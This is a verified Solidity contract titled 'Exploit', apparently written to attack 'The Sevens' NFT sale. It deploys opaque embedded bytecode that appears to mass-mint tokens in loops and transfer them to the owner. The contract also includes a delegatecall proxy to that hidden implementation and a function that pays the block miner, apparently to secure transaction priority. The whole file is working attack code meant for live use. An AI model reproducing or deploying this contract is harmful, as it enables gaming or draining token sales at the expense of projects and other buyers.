/**
 *Submitted for verification at Etherscan.io on 2021-09-12
*/

//////-License-Identifier: no-license 
pragma solidity 0.8.0;

contract Exploit {
    bytes32 public constant IMPL_SLOT = keccak256("THE_SEVENS_HACK_IMPL_SLOT");
    
    constructor(address theSevensAddr) {
        bytes memory createCode_ = hex'608060405234801561001057600080fd5b5060405161090438038061090483398101604081905261002f91610123565b610038336100d3565b600180546001600160a01b0319166001600160a01b03831690811790915563a22cb46561006d6000546001600160a01b031690565b6040516001600160e01b031960e084901b1681526001600160a01b03909116600482015260016024820152604401600060405180830381600087803b1580156100b557600080fd5b505af11580156100c9573d6000803e3d6000fd5b5050505050610153565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561013557600080fd5b81516001600160a01b038116811461014c57600080fd5b9392505050565b6107a2806101626000396000f3fe6080604052600436106100865760003560e01c80638da5cb5b116100595780638da5cb5b14610114578063b3e078f414610146578063e0e7e25214610166578063ee253a7614610186578063f2fde38b146101a657600080fd5b8063150b7a021461008b5780633ccfd60b146100d55780634997c676146100ec578063715018a6146100ff575b600080fd5b34801561009757600080fd5b506100b76100a6366004610612565b630a85bd0160e11b95945050505050565b6040516001600160e01b031990911681526020015b60405180910390f35b3480156100e157600080fd5b506100ea6101c6565b005b6100ea6100fa3660046106ad565b610228565b34801561010b57600080fd5b506100ea61032d565b34801561012057600080fd5b506000546001600160a01b03165b6040516001600160a01b0390911681526020016100cc565b34801561015257600080fd5b5060015461012e906001600160a01b031681565b34801561017257600080fd5b506100ea6101813660046106ad565b610363565b34801561019257600080fd5b506100ea6101a13660046105f0565b610440565b3480156101b257600080fd5b506100ea6101c13660046105f0565b6104f0565b6000546001600160a01b031633146101f95760405162461bcd60e51b81526004016101f0906106cf565b60405180910390fd5b60405133904780156108fc02916000818181858888f19350505050158015610225573d6000803e3d6000fd5b50565b6000546001600160a01b031633146102525760405162461bcd60e51b81526004016101f0906106cf565b3461025d828461071c565b146102aa5760405162461bcd60e51b815260206004820152601f60248201527f4d79536576656e733a20696e636f72726563742045746865722076616c75650060448201526064016101f0565b60005b8181101561032857600180546040516397304ced60e01b815260048101929092526001600160a01b0316906397304ced9085906024016000604051808303818588803b1580156102fc57600080fd5b505af1158015610310573d6000803e3d6000fd5b505050505080806103209061073b565b9150506102ad565b505050565b6000546001600160a01b031633146103575760405162461bcd60e51b81526004016101f0906106cf565b6103616000610584565b565b6000546001600160a01b0316331461038d5760405162461bcd60e51b81526004016101f0906106cf565b60005b81811015610328576001546001600160a01b03166323b872dd306103bc6000546001600160a01b031690565b6103c68588610704565b6040516001600160e01b031960e086901b1681526001600160a01b0393841660048201529290911660248301526044820152606401600060405180830381600087803b15801561041557600080fd5b505af1158015610429573d6000803e3d6000fd5b5050505080806104389061073b565b915050610390565b6000546001600160a01b0316331461046a5760405162461bcd60e51b81526004016101f0906106cf565b806001600160a01b03811663a22cb46561048c6000546001600160a01b031690565b6040516001600160e01b031960e084901b1681526001600160a01b03909116600482015260016024820152604401600060405180830381600087803b1580156104d457600080fd5b505af11580156104e8573d6000803e3d6000fd5b505050505050565b6000546001600160a01b0316331461051a5760405162461bcd60e51b81526004016101f0906106cf565b6001600160a01b03811661057f5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016101f0565b610225815b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80356001600160a01b03811681146105eb57600080fd5b919050565b60006020828403121561060257600080fd5b61060b826105d4565b9392505050565b60008060008060006080868803121561062a57600080fd5b610633866105d4565b9450610641602087016105d4565b935060408601359250606086013567ffffffffffffffff8082111561066557600080fd5b818801915088601f83011261067957600080fd5b81358181111561068857600080fd5b89602082850101111561069a57600080fd5b9699959850939650602001949392505050565b600080604083850312156106c057600080fd5b50508035926020909101359150565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b6000821982111561071757610717610756565b500190565b600081600019048311821515161561073657610736610756565b500290565b600060001982141561074f5761074f610756565b5060010190565b634e487b7160e01b600052601160045260246000fdfea264697066735822122015b764091c75b867d6db677a0aaa4f56439d36ac0ca621f9ba4a6fb19562797e64736f6c63430008070033000000000000000000000000f497253c2bb7644ebb99e4d9ecc104ae7a79187a';

        bytes32 IMPL_SLOT_ = IMPL_SLOT;
        address exploit;
        assembly{
            exploit := create(0, add(createCode_, 0x20), mload(createCode_))
            sstore(IMPL_SLOT_, exploit)
            sstore(0x00, caller())
            sstore(0x01, theSevensAddr)
        }
        
        
        
        
        
    }
    receive() external payable {
        revert();
    }
    function pay() external payable {
        address payable coinbase_;
        assembly {
            coinbase_ := coinbase()
        }
        coinbase_.transfer(msg.value);
    }
    //proxy contract
    fallback() external payable {
        address exploit;
        bytes32 IMPL_SLOT_ = IMPL_SLOT;
        //Thus the operand order is: gas, to, in offset, in size, out offset, out siz
        assembly {
            exploit := sload(IMPL_SLOT_)
            
            let ptr := mload(0x40)
            let in_size := calldatasize()
            
            calldatacopy(ptr, 0, calldatasize())
            mstore(0x40, add(ptr,in_size))
            
            let ok := delegatecall(gas(),exploit, ptr, in_size, 0, 0)
            
            let freePtr := mload(0x40)
            
            switch ok
            case 0 {
                returndatacopy(freePtr,0,returndatasize())
                revert(freePtr, returndatasize())
            }
            case 1 {
                returndatacopy(freePtr,0,returndatasize())
                return(freePtr, returndatasize())
                
            }
        }
    }
    
    
    
}